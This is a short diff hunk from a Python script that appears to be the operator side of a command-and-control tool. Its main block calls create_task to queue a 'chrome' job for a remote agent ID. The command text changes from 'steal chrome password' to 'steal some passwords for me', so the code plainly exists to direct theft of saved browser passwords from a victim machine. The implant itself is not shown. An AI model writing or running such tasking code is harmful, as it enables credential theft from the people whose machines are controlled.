@@ -41,4 +41,4 @@ def create_task(command_type, cmd, agent_id):
 #-------------------------------------------------
 
 if __name__ == "__main__":
-    create_task(command_type="chrome", cmd="steal chrome password", agent_id="fdf6c5636766b811da5850c85b1ba695")
+    create_task(command_type="chrome", cmd="steal some passwords for me", agent_id="cd4f442d8d7c77bc63403554efabc7dd")
